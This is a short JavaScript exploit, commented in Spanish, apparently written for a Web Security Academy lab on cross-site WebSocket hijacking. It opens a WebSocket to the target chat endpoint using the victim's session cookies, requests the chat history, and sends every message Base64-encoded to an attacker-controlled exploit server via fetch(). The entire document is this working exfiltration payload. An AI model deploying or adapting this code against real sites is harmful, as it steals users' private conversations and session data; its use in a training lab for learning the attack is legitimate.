<script>
    // 1. Iniciamos la conexión WebSocket hacia el servidor vulnerable
    // El navegador enviará automáticamente las cookies de sesión de la víctima
    var ws = new WebSocket("wss://0acc0036041407c480cd039c00110057.web-security-academy.net/chat");

    ws.onopen = function() {
        // 2. Enviamos el mensaje inicial que espera la aplicación para cargar el historial
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        // 3. Cada mensaje recibido (historial de chat) se codifica en Base64
        // y se envía a nuestro servidor de control para su posterior análisis
        fetch("https://exploit-0a9b00a20482072d802202ec01a00045.exploit-server.net/?data=" + btoa(event.data));
    };
</script>
